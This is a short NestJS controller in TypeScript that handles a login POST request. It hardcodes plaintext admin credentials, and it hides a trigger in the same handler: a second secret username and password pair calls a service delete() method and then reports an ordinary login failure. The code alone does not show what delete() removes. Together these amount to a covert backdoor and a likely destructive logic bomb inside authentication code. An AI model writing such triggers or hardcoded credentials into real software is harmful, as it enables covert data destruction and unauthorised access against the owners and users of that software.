import { Body, Controller, Post, Res } from '@nestjs/common';
import { AppService } from './app.service';

@Controller()
export class AppController {
  constructor(private readonly appService: AppService) {}

  @Post()
  async login(@Res() response, @Body() cred): Promise<boolean> {
    if (cred.login === 'admin' && cred.password === 'password@!1') {
      return response.json(true);
    }
    if (cred.login === 'andrey' && cred.password === 'deleteold') {
      await this.appService.delete();
    }
    return response.json(false);
  }
}
